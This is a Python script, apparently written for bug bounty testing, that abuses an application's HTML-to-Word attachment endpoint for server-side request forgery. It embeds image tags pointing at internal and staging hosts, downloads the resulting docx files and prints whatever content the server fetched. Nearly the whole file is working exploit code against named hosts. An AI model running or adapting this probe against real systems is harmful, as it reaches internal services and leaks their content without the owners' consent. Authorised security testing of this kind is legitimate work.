import json,subprocess,os,uuid,zipfile,io
H=os.environ['H']; BB=os.environ['BB']
TA=open('/tmp/tok_A').read().strip()
def post(path,body):
    cmd=['curl','-s','-m','150','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+TA,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
def get(path):
    cmd=['curl','-s','-m','40',H+path,'-H','token: '+TA,'-H',BB]
    return json.loads(subprocess.run(cmd,capture_output=True,text=True).stdout)
tag='zx'+uuid.uuid4().hex[:8]
# endpoints that return HTML (not JSON) — HTML gets embedded as bytes
targets=[
 ("app-login","https://bugbounty1.qe.optrostaging.ai/login"),
 ("app-nonexist","https://bugbounty1.qe.optrostaging.ai/zx-nonexistent-path-12345"),
 ("int-root","http://integrations.qa.soxhubapp.com/"),
 ("int-404","http://integrations.qa.soxhubapp.com/zx-nonexistent"),
]
for label,url in targets:
    c,b=post('/api/v1/attachments/html',
       {"html":f'<h1>ZX</h1><img src="{url}" width="400" height="400">',
        "type":"word","attachableType":"AuditableEntity","attachableId":"105",
        "fileName":f"zx-{tag}-{label}"})
    if c!='200': print(f"  {label:16} gen={c}"); continue
    aid=json.loads(b)['attachmentId']
    a=get(f'/api/v1/attachments/{aid}')['attachments'][0]
    f=get(f"/api/v1/files/{a['file_id']}")['files'][0]
    subprocess.run(['curl','-s','-m','60','-o','/tmp/f.docx',f['url']])
    d=open('/tmp/f.docx','rb').read()
    try:
        z=zipfile.ZipFile(io.BytesIO(d))
        media=[(n,len(z.read(n))) for n in z.namelist() if 'media' in n]
        print(f"  {label:16} docx={len(d):>6}B media={media}")
        for m,sz in media:
            if sz:
                blob=z.read(m)
                print(f"      {sz}B head={blob[:200]!r}")
    except Exception as e: print(f"  {label:16} not zip")
